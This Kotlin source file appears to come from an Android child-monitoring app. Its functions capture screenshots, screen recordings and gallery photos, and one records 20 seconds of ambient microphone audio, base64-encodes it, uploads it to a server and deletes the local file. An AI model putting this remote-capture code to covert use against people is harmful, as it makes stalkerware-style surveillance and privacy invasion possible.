package com.example.kidsguardchild.media

import android.content.Context
import android.media.MediaRecorder
import android.util.Base64
import android.util.Log
import com.example.kidsguardchild.ScreenshotCapture
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.DataUploader
import com.example.kidsguardchild.core.PhotoBody
import com.example.kidsguardchild.modules.PhotosModule
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

private const val TAG = "MediaCaptureManager"

object MediaCaptureManager {

    suspend fun captureScreenshot(context: Context, source: String) {
        ScreenshotCapture.captureAndUpload(context, source, "screenshot")
    }

    suspend fun syncGallery(context: Context, maxItems: Int = 40) {
        PhotosModule(context).syncGalleryBulk(maxItems)
    }

    suspend fun recordSurround(context: Context) = withContext(Dispatchers.IO) {
        val output = File(context.cacheDir, "surround_${System.currentTimeMillis()}.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(output.absolutePath)
                prepare()
                start()
            }
            kotlinx.coroutines.delay(20_000)
            recorder.stop()
            recorder.release()
            val bytes = output.readBytes()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            DataUploader.upload("SurroundAudio") {
                ApiClient.service.postPhoto(
                    PhotoBody(
                        url = "data:audio/mp4;base64,$b64",
                        title = "Surround recording (20s)",
                        type = "audio"
                    )
                )
            }
            output.delete()
            Log.i(TAG, "Surround audio uploaded")
        } catch (e: Exception) {
            Log.e(TAG, "Surround record failed: ${e.message}")
            try { recorder?.release() } catch (_: Exception) {}
            output.delete()
        }
    }

    suspend fun captureScreenRecording(context: Context) {
        ScreenshotCapture.captureAndUpload(context, "Screen record", "screen_record")
    }

    suspend fun captureLiveScreen(context: Context) {
        ScreenshotCapture.captureAndUpload(context, "Live screen", "live_screen")
    }

    suspend fun captureLatestPhoto(context: Context) {
        ScreenshotCapture.captureAndUpload(context, "Camera/Gallery", "gallery")
    }

    suspend fun captureVideosMetadata(context: Context) {
        PhotosModule(context).syncVideoBulk(20)
    }
}
